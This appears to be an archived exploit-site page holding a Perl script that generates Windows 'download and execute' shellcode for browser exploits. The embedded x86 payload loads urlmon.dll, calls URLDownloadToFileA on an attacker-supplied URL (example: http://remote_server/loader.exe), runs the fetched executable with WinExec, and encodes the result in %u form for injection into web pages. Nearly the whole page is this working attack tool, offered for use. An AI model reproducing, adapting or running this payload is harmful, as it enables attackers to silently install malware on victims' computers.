<html><head><title>Windows - Download and Execute Shellcode Generator</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
#!/usr/bin/perl

$loading_url=$ARGV[0];
chomp ($loading_url);
my @buffer;

if ($loading_url eq &quot;&quot;) {
$sco = 'ERROR!!! Enter url to remote exe.';
buffer_gen($sco);
print @buffer;
exit;
}

$c= generate_char(0);

$sco= &quot;\xE8\x56\x00\x00\x00\x53\x55\x56\x57\x8B\x6C\x24\x18\x8B\x45&quot;.
      &quot;\x3C\x8B\x54\x05\x78\x01\xEA\x8B\x4A\x18\x8B\x5A\x20\x01\xEB&quot;.
      &quot;\xE3\x32\x49\x8B\x34\x8B\x01\xEE\x31\xFF\xFC\x31\xC0\xAC\x38&quot;.
      &quot;\xE0\x74\x07\xC1\xCF\x0D\x01\xC7\xEB\xF2\x3B\x7C\x24\x14\x75&quot;.
      &quot;\xE1\x8B\x5A\x24\x01\xEB\x66\x8B\x0C\x4B\x8B\x5A\x1C\x01\xEB&quot;.
      &quot;\x8B\x04\x8B\x01\xE8\xEB\x02\x31\xC0\x5F\x5E\x5D\x5B\xC2\x08&quot;.
      &quot;\x00\x5E\x6A\x30\x59\x64\x8B\x19\x8B\x5B\x0C\x8B\x5B\x1C\x8B&quot;.
      &quot;\x1B\x8B\x5B\x08\x53\x68\x8E\x4E\x0E\xEC\xFF\xD6\x89\xC7\x53&quot;.
      &quot;\x68\x8E\x4E\x0E\xEC\xFF\xD6\xEB\x50\x5A\x52\xFF\xD0\x89\xC2&quot;.
      &quot;\x52\x52\x53\x68\xAA\xFC\x0D\x7C\xFF\xD6\x5A\xEB\x4D\x59\x51&quot;.
      &quot;\x52\xFF\xD0\xEB\x72\x5A\xEB\x5B\x59\x6A\x00\x6A\x00\x51\x52&quot;.
      &quot;\x6A\x00\xFF\xD0\x53\x68\xA0\xD5\xC9\x4D\xFF\xD6\x5A\x52\xFF&quot;.
      &quot;\xD0\x53\x68\x98\xFE\x8A\x0E\xFF\xD6\xEB\x44\x59\x6A\x00\x51&quot;.
      &quot;\xFF\xD0\x53\x68\x7E\xD8\xE2\x73\xFF\xD6\x6A\x00\xFF\xD0\xE8&quot;.
      &quot;\xAB\xFF\xFF\xFF\x75\x72\x6C\x6D\x6F\x6E\x2E\x64\x6C\x6C\x00&quot;.
      &quot;\xE8\xAE\xFF\xFF\xFF\x55\x52\x4C\x44\x6F\x77\x6E\x6C\x6F\x61&quot;.
      &quot;\x64\x54\x6F\x46\x69\x6C\x65\x41\x00\xE8\xA0\xFF\xFF\xFF\x2E&quot;.
      &quot;\x2E\x5C&quot;.$c.&quot;\x00\xE8\xB7\xFF\xFF\xFF\x2E\x2E\x5C&quot;.$c.&quot;\x00&quot;.
      &quot;\xE8\x89\xFF\xFF\xFF&quot;.$loading_url.&quot;\x00&quot;;

$sco=convert_sco($sco);
buffer_gen($sco);
print @buffer;

sub generate_char()
{
 my $wdsize = shift;
 my @alphanumeric = ('a'..'z');
 my $wd = join '',
 map $alphanumeric[rand @alphanumeric], 0..$wdsize;
  return $wd;
}

sub convert_sco {
        my $data = shift;
        my $mode = shift() || 'LE';
        my $code = '';

        my $idx = 0;

        if (length($data) % 2 != 0) {
                $data .= substr($data, -1, 1);
        }

        while ($idx &lt; length($data) - 1) {
                my $c1 = ord(substr($data, $idx, 1));
                my $c2 = ord(substr($data, $idx+1, 1));
                if ($mode eq 'LE') {
                        $code .= sprintf('%%u%.2x%.2x', $c2, $c1);
                } else {
                        $code .= sprintf('%%u%.2x%.2x', $c1, $c2);
                }
                $idx += 2;
        }

        return $code;
}

sub buffer_gen(){
$sco = shift;
@buffer=&lt;&lt;FX;

    Win32 Download and Execute Shellcode Generator (browsers edition)
    Size: 275 bytes + loading_url
    Author: Yag Kohha (skyhole [at] gmail.com)
    
    Usage: ./sco http://remote_server/loader.exe
    
    Greetz to:
     str0ke \&amp; milw0rm project
     shinnai
     h07
     rgod
     H.D. Moor \&amp; Metaspl0it
     offtopic
     3APA3A
    
-------&gt; Start

$sco

-------&gt; End
FX

}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
